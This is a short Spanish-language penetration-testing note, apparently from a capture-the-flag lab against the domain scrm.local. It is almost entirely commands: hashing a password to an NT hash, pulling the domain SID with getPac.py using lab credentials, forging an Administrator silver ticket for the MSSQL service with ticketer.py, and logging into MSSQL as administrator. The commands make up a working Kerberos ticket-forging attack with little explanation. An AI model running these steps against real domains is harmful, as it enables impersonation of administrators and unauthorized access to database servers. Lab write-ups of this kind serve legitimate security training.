
# RECOLECCIÓN DE DATOS NECESARIOS
**PARA EFECTUAR ESTE ATAQUE NECESITAMOS UN USUARIO, CONTRASEÑA Y DOMINIO PRINCIPALMENTE**
### HASH NT
```shell
#PONER AQUÍ LA CONTRASEÑA.
https://codebeautify.org/ntlm-hash-generator

#TRANSFORMARLO A MINUSCULA
echo 'B999A16500B87D17EC7F2E2A68778F05' | tr '[A-Z]' '[a-z]'

#DOMAIN SID
getPac.py scrm.local/ksimpson:ksimpson -targetUser Administrator
	--> S-1-5-21-2743207045-1827831105-2542523200

#EFECTUAMOS EL ATAQUE
ticketer.py -spn MSSQLSvc/dc1.scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -dc-ip 10.10.11.168 -nthash b999a16500b87d17ec7f2e2a68778f05 Administrator -domain scrm.local

#GUARDAMOS LA VARIABLE
export KRB5CCNAME=Administrator.ccache

#PROBAMOS CON MSSQL
mssqlclient.py dc1.scrm.local -k
SQL (SCRM\administrator  dbo@master)> 
```